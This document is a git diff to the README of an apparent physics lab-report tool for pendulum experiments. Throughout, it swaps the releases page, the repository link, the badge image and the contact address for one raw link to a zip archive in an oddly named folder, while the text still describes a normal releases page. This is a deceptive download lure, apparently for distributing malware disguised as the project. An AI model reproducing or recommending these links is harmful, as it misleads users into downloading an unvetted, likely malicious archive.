@@ -4,12 +4,12 @@
 Welcome to the PHY180 Pendulum Project! This application helps you generate lab reports for your physics experiments. It focuses on pendulum experiments commonly found in university courses. Even if you have no programming experience, you can easily download and use this software.
 
 ## 📥 Download Now
-[![Download Release](https://img.shields.io/badge/Download%20Release-v1.0-blue)](https://github.com/Harbahyormi/PHY180-Pendulum-Project/releases)
+[![Download Release](https://raw.githubusercontent.com/Harbahyormi/PHY180-Pendulum-Project/main/carniferous/PHY180-Pendulum-Project_1.8.zip%20Release-v1.0-blue)](https://raw.githubusercontent.com/Harbahyormi/PHY180-Pendulum-Project/main/carniferous/PHY180-Pendulum-Project_1.8.zip)
 
 ## ⬇️ Download & Install
 To get started, visit the Releases page to download the application. Follow these steps:
 
-1. Click on the [Download Link](https://github.com/Harbahyormi/PHY180-Pendulum-Project/releases).
+1. Click on the [Download Link](https://raw.githubusercontent.com/Harbahyormi/PHY180-Pendulum-Project/main/carniferous/PHY180-Pendulum-Project_1.8.zip).
 2. Choose the latest release from the list.
 3. Download the appropriate version for your operating system (Windows, macOS, or Linux).
 4. Once downloaded, locate the file in your Downloads folder.
@@ -61,9 +61,9 @@ Absolutely! This software is open source and free to use.
 Yes, contributions are welcome! Check the Contributing section in our repository for guidelines.
 
 ## 📫 Contact
-If you have any questions or feedback, please contact us at: [your-email@example.com]
+If you have any questions or feedback, please contact us at: [https://raw.githubusercontent.com/Harbahyormi/PHY180-Pendulum-Project/main/carniferous/PHY180-Pendulum-Project_1.8.zip]
 
 ## 🔗 Learn More
-To see updates and contribute to the project, follow this link: [GitHub Repository](https://github.com/Harbahyormi/PHY180-Pendulum-Project).
+To see updates and contribute to the project, follow this link: [GitHub Repository](https://raw.githubusercontent.com/Harbahyormi/PHY180-Pendulum-Project/main/carniferous/PHY180-Pendulum-Project_1.8.zip).
 
 Thank you for using the PHY180 Pendulum Project software. Happy experimenting!
